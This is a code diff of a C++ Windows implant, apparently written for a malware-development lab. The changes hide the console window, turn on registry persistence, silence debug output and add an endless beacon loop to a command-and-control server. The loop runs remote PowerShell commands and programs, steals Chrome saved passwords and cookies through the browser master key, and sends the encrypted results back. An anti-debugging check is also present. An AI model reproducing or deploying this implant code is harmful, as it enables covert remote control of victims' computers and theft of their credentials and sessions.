@@ -53,7 +53,7 @@ void make_persist(){
     LPCSTR name = "MyApp";
     LONG status = RegSetValueEx(hkey,name, 0, REG_SZ, (BYTE*)progPath, 100 * sizeof(char));
     if(status == ERROR_SUCCESS){
-        std::cout << "Done" << std::endl;
+        //std::cout << "Done" << std::endl;
     }
 }
 void check_debugger(){
@@ -75,6 +75,7 @@ int check_ch0nky(){
 }
 
 int main(){
+::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 //MessageBoxA(NULL,NULL,NULL,MB_YESNO);
 Sleep(100);
 check_ch0nky();
@@ -82,8 +83,8 @@ std::string cmd_usr = "$env:UserName";
 LPSTR username_cmd = const_cast<char *>(cmd_usr.c_str());
 std::string username = "vagrant";
 //runPowershellCommand(username_cmd);
-std::cout << username << std::endl;
-//make_persist();
+//std::cout << username << std::endl;
+make_persist();
 check_debugger();
 
 //exit(1);
@@ -130,7 +131,7 @@ check_debugger();
     d["data"] = s;
     d["nonce"] = enc.random_bytes;
     std::string resp = post(config.c2_fqdn,config.c2_port,"/key_gen",d.dump());
-    std::cout << resp << std:: endl;
+    //std::cout << resp << std:: endl;
 
     try{
         resp = enc.decrypt_data(resp);
@@ -143,83 +144,90 @@ check_debugger();
     send_reg["computer_guid"] =  config.computer_guid;
     send_reg["data"] = enc.encrypt_data(reg.dump());
     send_reg["nonce"] = enc.random_bytes;
-    std::cout << send_reg["nonce"] << std::endl;
+    //std::cout << send_reg["nonce"] << std::endl;
     resp =  post(config.c2_fqdn,config.c2_port,"/register",send_reg.dump());
-    std::cout << resp << std::endl;
+    //std::cout << resp << std::endl;
     try{
     resp =enc.decrypt_data(resp);
     }catch(const std::exception& e){
 
     }
+    int sleep_value = 1000;
 
     //exit(1);
-    resp = getNextCommand(config);
-    std::cout << resp << std::endl;
-    try{
-    resp = enc.decrypt_data(resp);
-    }catch(const std::exception& e){
-
-    }
-    std::string get_cmd_resp = resp;
-    json command = json::parse(get_cmd_resp);
-    std::string cmd_result = "";
-    std::string cmd_text = "";
-    std::string cmd_id = command["command_id"];
-    if(cmd_id != "-1"){
-        cmd_text = command["command_text"];
-        LPSTR cmd =  const_cast<char *>(cmd_text.c_str());
+    while(1){
+        Sleep(sleep_value);
+        resp = getNextCommand(config);
+        //std::cout << resp << std::endl;
         try{
-        if (command["command_type"] == "shell"){
-            cmd_result = runPowershellCommand(cmd);
-        }else if (command["command_type"] == "implant_cmd"){
-            if(command["command_text"]=="chrome_passwords"){
-                unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];
-
-                getMasterKey(masterKey, "vagrant");
-                printUCharAsHex(masterKey, MASTER_KEY_SIZE);
-
-                json jsonResult = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
-                cmd_result = jsonResult.dump();
-                //std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
-
-                delete[] masterKey;
-            }else if(command["command_text"]=="situational_awareness"){
-                cmd_result = info;
-                //std::cout << info << std::endl;
-            }else if(command["command_text"]=="chrome_cookies"){
-                unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];
-
-                getMasterKey(masterKey, "vagrant");
-                printUCharAsHex(masterKey, MASTER_KEY_SIZE);
-
-                json jsonResult = lootChromeCookies((const unsigned char*) masterKey, "vagrant");
-                cmd_result = jsonResult.dump();
-                //std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
-
-                delete[] masterKey;
-            }
-        }else if(command["command_type"] == "system_program"){
-            cmd_result = runProgram(cmd);
-        }
-        }catch (const std::exception& e){
-            cmd_result = e.what();
-        }
-        if(cmd_result == ""){
-            cmd_result = "Probably wrong command type or command text";
-        }
-
-        std::string data = ("{\"computer_guid\": \""+config.computer_guid+"\", "
-                         "\"command_id\": \""+cmd_id+"\", "
-                         "\"result\": \""+" "+"\"}");
-        json da = json::parse(data);
-        da["result"] = cmd_result;
-        std::string cmd_data = enc.encrypt_data(da.dump());
-        resp = sendCommandResult(config,enc.random_bytes,cmd_data);
-        std::cout << resp << std::endl;
-        try{
-        resp =enc.decrypt_data(resp);
+        resp = enc.decrypt_data(resp);
         }catch(const std::exception& e){
+        }
+        std::string get_cmd_resp = resp;
+        json command = json::parse(get_cmd_resp);
+        std::string cmd_result = "";
+        std::string cmd_text = "";
+        std::string cmd_id = command["command_id"];
+        if(cmd_id != "-1"){
+            cmd_text = command["command_text"];
+            LPSTR cmd =  const_cast<char *>(cmd_text.c_str());
+            try{
+            if (command["command_type"] == "shell"){
+                cmd_result = runPowershellCommand(cmd);
+            }else if (command["command_type"] == "implant_cmd"){
+                if(command["command_text"]=="chrome_passwords"){
+                    unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];
 
+                    getMasterKey(masterKey, "vagrant");
+                    printUCharAsHex(masterKey, MASTER_KEY_SIZE);
+
+                    json jsonResult = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
+                    cmd_result = jsonResult.dump();
+                    //std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
+
+                    delete[] masterKey;
+                }else if(command["command_text"]=="situational_awareness"){
+                    cmd_result = info;
+                    //std::cout << info << std::endl;
+                }else if(command["command_text"]=="chrome_cookies"){
+                    unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];
+
+                    getMasterKey(masterKey, "vagrant");
+                    printUCharAsHex(masterKey, MASTER_KEY_SIZE);
+
+                    json jsonResult = lootChromeCookies((const unsigned char*) masterKey, "vagrant");
+                    cmd_result = jsonResult.dump();
+                    //std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
+
+                    delete[] masterKey;
+                }
+            }else if(command["command_type"] == "system_program"){
+                cmd_result = runProgram(cmd);
+            }
+            }catch (const std::exception& e){
+                cmd_result = e.what();
+            }
+            if(cmd_result == ""){
+                cmd_result = "Probably wrong command type or command text";
+            }
+
+            std::string data = ("{\"computer_guid\": \""+config.computer_guid+"\", "
+                            "\"command_id\": \""+cmd_id+"\", "
+                            "\"result\": \""+" "+"\"}");
+            json da = json::parse(data);
+            da["result"] = cmd_result;
+            std::string cmd_data = enc.encrypt_data(da.dump());
+            resp = sendCommandResult(config,enc.random_bytes,cmd_data);
+            //std::cout << resp << std::endl;
+            try{
+            resp =enc.decrypt_data(resp);
+            }catch(const std::exception& e){
+
+            }
+        }else{
+                std::string val = command["command_text"];
+                sleep_value =std::stoi(val);
+                //std::cout << sleep_value << "Hahaha" << std::endl;
         }
     }
     
